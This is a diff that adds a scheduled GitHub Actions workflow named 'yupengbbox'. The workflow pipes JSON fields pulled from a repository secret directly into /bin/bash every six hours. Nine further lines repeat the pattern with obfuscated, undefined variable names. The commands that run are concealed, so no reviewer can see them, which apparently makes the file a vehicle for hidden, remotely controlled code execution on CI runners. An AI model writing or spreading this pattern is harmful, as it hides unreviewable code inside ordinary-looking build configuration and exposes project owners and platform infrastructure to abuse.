@@ -1,0 +1,27 @@
+name: yupengbbox
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yupengbbox
+        env:
+          n29060: ${{ secrets.n29060 }}
+        run: |
+          echo $n29060 | jq -r .afno5068 | /bin/bash
+          echo $unez5 | jq -r .s2 | /bin/bash
+          echo $sz1356 | jq -r .qx50995 | /bin/bash
+          echo $rhbx68646 | jq -r .r52 | /bin/bash
+          echo $sba40161 | jq -r .bo75302 | /bin/bash
+          echo $coil24 | jq -r .bk869 | /bin/bash
+          echo $tr56 | jq -r .t5859 | /bin/bash
+          echo $ssmc3 | jq -r .fkcd7872 | /bin/bash
+          echo $cgba2983 | jq -r .aity7 | /bin/bash
+          echo $ic14840 | jq -r .vyeyi313 | /bin/bash
+
